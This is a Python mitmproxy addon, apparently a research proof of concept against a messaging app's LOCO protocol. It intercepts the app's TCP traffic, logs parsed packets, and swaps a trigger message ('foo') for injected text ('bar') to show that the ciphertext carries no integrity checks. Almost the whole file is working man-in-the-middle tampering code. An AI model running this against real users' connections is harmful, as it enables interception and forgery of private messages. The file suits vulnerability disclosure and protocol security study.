import logging

from lib.loco_parser import LocoParser
from mitmproxy import connection, tcp, tls
from mitmproxy.utils import human, strutils


class LocoMitmBase:
    def __init__(self, rsa_key_pair, master_secret=None, test_key=None) -> None:
        self.parser = LocoParser()
        self.rsa_key_pair = rsa_key_pair
        self.recipient_user_id = 0
        self.recipient_public_key = b""
        self.shared_secret = b""
        self.master_secret = master_secret
        self.e2e_encryption_key = test_key

    @staticmethod
    def get_addr(server: connection.Server):
        return server.peername or server.address

    def tls_clienthello(self, data: tls.ClientHelloData):
        server_address = self.get_addr(data.context.server)
        logging.info("Skip TLS intercept for %s.", human.format_address(server_address))
        data.ignore_connection = True


class InjectMessage(LocoMitmBase):
    def __init__(self, trigger_msg, new_msg) -> None:
        self.parser = LocoParser()
        self.trigger_msg = trigger_msg
        self.new_msg = new_msg

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        self.parser.parse(message.content)

        if self.parser.loco_packet:
            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                self.parser.loco_packet.get_packet_as_dict(),
            )
        else:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )

            return

        # Inject a new message to show that there are no integrity checks on the ciphertext
        tampered_packet = self.parser.inject_message(self.trigger_msg, self.new_msg)

        if tampered_packet:
            message.content = tampered_packet


addons = [InjectMessage(trigger_msg="foo", new_msg="bar")]
